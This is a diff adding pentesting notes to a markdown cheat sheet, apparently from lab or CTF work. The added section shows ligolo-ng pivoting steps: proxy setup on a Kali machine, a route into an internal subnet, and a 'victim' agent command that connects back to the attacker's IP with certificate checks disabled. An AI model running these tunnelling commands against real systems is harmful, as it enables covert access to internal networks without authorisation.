@@ -68,3 +68,33 @@
 #### Clean up
 - remove firewall rule ``` netsh advfirewall firewall delete rule name="port_forward_ssh_2222" ```
 - remove port fwing ``` netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64 ```
+
+#  ligolo-ng
+- https://github.com/nicocha30/ligolo-ng/releases/tag/v0.6.2
+- https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5 
+## Proxy (Kali) Setup
+1. ``` 
+    # Adds a new tun interface to our machine.
+    sudo ip tuntap add user kali mode tun ligolo
+
+    # Enables the new interface.
+    sudo ip link set ligolo up
+    ```
+2. ```
+    # With the -selfcert flag the tool dynamically 
+    # generates self-signed certificates.
+
+    ./proxy -selfcert
+    ```
+3. (After agent connected)
+   ```
+    sudo ip route add 172.16.5.0/24 dev ligolo
+    ```
+## Agent (Victim)
+1. ```
+    # The IP will be the IP of our Kali VM/attacking machine.
+    # The -ignore-cert ignores certificate validation. 
+    # This means we won't have any issues with our self-signed certs.
+
+    ./agent -connect 10.10.14.213:11601 -ignore-cert
+    ```
